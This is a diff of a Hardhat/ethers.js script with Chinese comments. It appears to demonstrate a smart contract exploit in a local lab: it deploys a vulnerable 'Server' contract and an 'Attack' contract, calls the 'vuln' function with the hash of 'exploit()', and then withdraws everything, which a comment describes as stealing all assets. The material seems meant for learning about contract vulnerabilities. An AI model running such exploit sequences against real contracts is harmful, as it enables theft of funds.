@@ -7,19 +7,15 @@ async function getBalanceAt(addr) {
 }
 
 async function main() {
-    // 返回任意长度的合约账号地址
+    // 返回任意长度的合约账号地址 比如我这里只要返回两个就行
     const [victim, attacker] = await ethers.getSigners();
-
-    // await network.provider.send("hardhat_setBalance", [
-    //     await attacker.getAddress(),
-    //     "0x10000000000000000",
-    // ]);// clear attacker's balance but only remain gas fee
 
     console.log(`Victim account's address is ${await victim.getAddress()}`);
     console.log(`Attacker account's address is ${await attacker.getAddress()}`);
 
     const init_amount = ethers.parseEther("10");
 
+    // 部署Server合约
     const server = await ethers.deployContract("Server", {
         signer: victim,
         value: init_amount,
@@ -30,11 +26,7 @@ async function main() {
 
     console.log(`Server contract's balance is ${await getBalanceAt(await server.getAddress())} Wei`);
 
-    // const receiver = await ethers.deployContract("Receiver", [], {
-    //     signer: attacker,
-    // });
-    // await receiver.waitForDeployment();
-
+    // 部署Attacker合约
     const attack = await ethers.deployContract(
         "Attack", 
         [], 
@@ -45,12 +37,13 @@ async function main() {
     console.log(`Attack contract deployed at ${await attack.getAddress()}`)
 
     const hash = (str) => {return ethers.keccak256(ethers.toUtf8Bytes(str))};
-    // const payload = "exploit(" + hash(receiver.getAddress()) + ")";
+    // 调用Server合约的漏洞函数
     await server.vuln(
         await attack.getAddress(),
         hash("exploit()")
     )
-
+    
+    // 盗窃走所有资产 此时Receiver合约有log
     await server.withdraw();
 
 }
